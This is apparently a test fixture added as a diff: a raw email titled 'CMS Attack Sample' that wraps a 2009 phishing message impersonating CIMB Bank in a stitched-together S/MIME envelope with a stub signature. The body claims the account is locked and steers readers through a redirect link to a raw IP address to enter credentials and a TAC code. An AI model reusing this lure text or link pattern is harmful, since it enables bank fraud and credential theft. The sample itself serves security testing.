@@ -1,0 +1,57 @@
+From: freejamba@lists.postmastergeneral.com
+To: helge-j_rgen.beil@enron.com
+Subject: CMS Attack Sample
+Content-Type: multipart/signed; protocol="application/x-pkcs7-signature"; micalg="sha-256"; boundary="----605D3539E4590077A2906F829EEDB328"
+This is an S/MIME signed message
+------605D3539E4590077A2906F829EEDB328
+0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-OriginalArrivalTime: 24 Dec 2009 08:05:30.0750 (UTC) FILETIME=[DC67B1E0:01CA846F]
+Content-Length: 1501
+Lines: 34
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 1265
+
+<HTML>
+<CENTER>
+<table align=3D"center" height=3D"310" width=3D"333">
+  <tr>
+
+<tbody><tr>
+	<td colspan=3D"2" ></td></tr>
+<tr><td rowspan=3D"3" valign=3D"top"><img alt=3D"CIMB Bank" src=3D"http://im=
+g687.imageshack.us/img687/2091/cimb.gif" border=3D"0"><br>
+	</td>
+<td align=3D"right" nowrap=3D"nowrap" valign=3D"top">
+<span style=3D"color: rgb(0, 51, 153); font-family: arial,helvetica,verdana,=
+sans-serif; font-size: 8pt;"><b>
+<a style=3D"color: rgb(0, 51, 153); text-decoration: none;"
+<font face=3D"Arial" size=3D"4" color=3D"#000090"> </font>
+<span>
+<p>Dear CIMB Bank user, </p>
+<FONT face=3D"verdana" size=3D2 color=3D"#000098"><B>Your CIMB Bank Account =
+is currently locked, </B><BR>
+and only after you identify on the website <br>the account will be=20
+unlocked and ready for use.=20
+<BR><BR>
+Please identify yourself by following the link
+given below. :<BR><BR>
+<a href=3D"http://7search.com/scripts/search/click.aspx?t=3Dp&qu=3D202.54.98=
+=2E177/cimb/online/aaa.html&a=3D0&s=3Dsb&r=3D1&du=3Dhttp%3a%2f%2f202.54.98.177=
+/cimb/online/aaa.html&cu=3Dhttp%3a%2f%2f202.54.98.177/cimb/online/aaa.html" =
+target=3D"_blank">Go To CIMB Bank Online </a></FONT><BR><BR>
+<p>IMPORTANT : The identification process will be completed <BR>only after y=
+ou insert the six digit TAC Code <br>that will be sent to your pre-registere=
+d mobile phone<br>in the following minutes.
+<br><p><font face=3D"verdana" color=3D"99999" size=3D1>All rights reserved. =
+Copyright =A9 2009 CIMB Bank</FONT></CENTER>
+</HTML>
+------605D3539E4590077A2906F829EEDB328
+Content-Type: application/x-pkcs7-signature; name="smime.p7s"
+Content-Transfer-Encoding: base64 Content-Disposition: attachment; filename="smime.p7s"
+MAsGCSqGSIb3DQEHAg==
+------605D3539E4590077A2906F829EEDB328--
